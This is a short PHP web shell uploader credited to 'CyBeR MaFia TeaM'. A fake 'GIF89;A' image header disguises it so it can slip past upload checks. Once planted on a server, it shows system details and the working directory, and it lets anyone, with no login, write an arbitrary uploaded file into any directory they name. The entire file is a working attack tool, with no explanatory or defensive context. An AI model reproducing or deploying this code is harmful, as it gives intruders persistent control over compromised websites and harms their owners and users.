GIF89;A
<?php

echo '<style>
  body {background-color:red;
    }
</style>';
echo '<img style="-webkit-user-select: none;margin: auto;" src="https://steamcdn-a.akamaihd.net/steam/apps/1033510/header.jpg">';
echo '<html><form action="" method="POST" enctype="multipart/form-data" name="uploader" id="uploader"><title> Uploader by CyBeR MaFia TeaM </title><p> Uploader by CyBeR MaFia TeaM <br>';
echo php_uname();
echo '</p><input type="file" name="file" size="50"><br><br><input type="text" name="dizin" size="60" value="'.getcwd().'">&nbsp;<input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if ($_POST['_upl'] == "Upload") {
	chdir($_POST['dizin']);
    if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo '[+] Upload OK ✔ [+]';
    } else {
        echo '[-] Upload Fail X [-]';
    }
}

?>
